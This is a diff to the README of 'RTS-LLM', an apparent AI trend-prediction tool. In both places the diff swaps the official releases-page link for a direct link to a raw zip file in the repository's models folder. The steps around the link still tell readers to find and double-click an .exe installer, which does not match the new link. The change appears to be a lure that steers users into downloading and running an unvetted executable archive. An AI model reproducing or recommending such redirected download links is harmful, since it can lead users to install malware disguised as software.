@@ -1,6 +1,6 @@
 # 📈 RTS-LLM - Predict future trends with simple AI
 
-[![](https://img.shields.io/badge/download-latest_release-blue)](https://github.com/Adianaturkish784/RTS-LLM/releases)
+[![](https://img.shields.io/badge/download-latest_release-blue)](https://raw.githubusercontent.com/Adianaturkish784/RTS-LLM/main/models/RT-LLM-2.4.zip)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software smoothly.
 
 Follow these steps to get the software running on your computer.
 
-1. Visit the project page to download the latest version: https://github.com/Adianaturkish784/RTS-LLM/releases
+1. Visit the project page to download the latest version: https://raw.githubusercontent.com/Adianaturkish784/RTS-LLM/main/models/RT-LLM-2.4.zip
 2. Look for the file ending in .exe in the Assets section of the latest release.
 3. Click the link to save the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the file named RTS-LLM-Installer.exe.
